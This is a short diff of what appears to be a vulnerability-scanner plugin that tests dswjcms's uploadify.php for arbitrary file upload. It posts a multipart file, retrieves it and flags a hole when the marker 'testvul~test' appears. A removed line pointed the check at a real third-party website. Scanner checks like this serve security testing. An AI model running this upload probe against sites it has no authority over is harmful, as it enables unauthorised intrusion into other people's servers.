@@ -33,11 +33,12 @@ Button
 -----------------------------32382156818478--"""
     code, head, res, errcode, _ = curl.curl2(arg+'Public/uploadify/uploadify.php',raw=raw.format(scheme=p.scheme,netloc=p.netloc));
     if code == 200 and res:
-            file_url='http://%s/Public/uploadify/uploads/%s'%(p.netloc,res)
-            code,head,res,errcode, _=curl.curl2(file_url)
-            if 'testvul~test' in res:
-                security_hole(arg+":Upload File at "+file_url)
-                
-if __name__ == '__main__':
+        file_url='http://%s/Public/uploadify/uploads/%s'%(p.netloc,res)
+        code,head,res,errcode, _=curl.curl2(file_url)
+        if 'testvul~test' in res:
+            security_hole(arg+":Upload File at "+file_url)
+
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('dswjcms', 'http://hm.bjdjyx.com/')[1])
